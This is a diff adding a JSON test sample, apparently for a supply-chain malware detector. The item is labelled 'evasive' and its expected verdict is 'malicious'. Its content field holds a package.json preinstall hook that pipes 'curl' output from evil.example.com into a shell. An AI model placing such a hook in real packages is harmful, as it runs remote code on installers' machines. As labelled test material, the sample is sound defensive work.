@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::113::combination-variations::1",
+  "base_sample_id": "exp::supply-chain-detector::113",
+  "generator_id": "combination-variations",
+  "generator_version": "1.0.0",
+  "seed": 237090181,
+  "content": "In this fictional scenario: {\"content\": \"{\\\"scripts\\\": {\\\"preinstall\\\": \\\"curl -s https://evil.example.com/payload.sh | sh\\\"}}\\n\"}",
+  "content_hash": "6909c50761975a89682b40222d65e95503cec948c2bafa24cbafb7ae01448eac",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "combination:structural+semantic",
+  "difficulty": "evasive"
+}
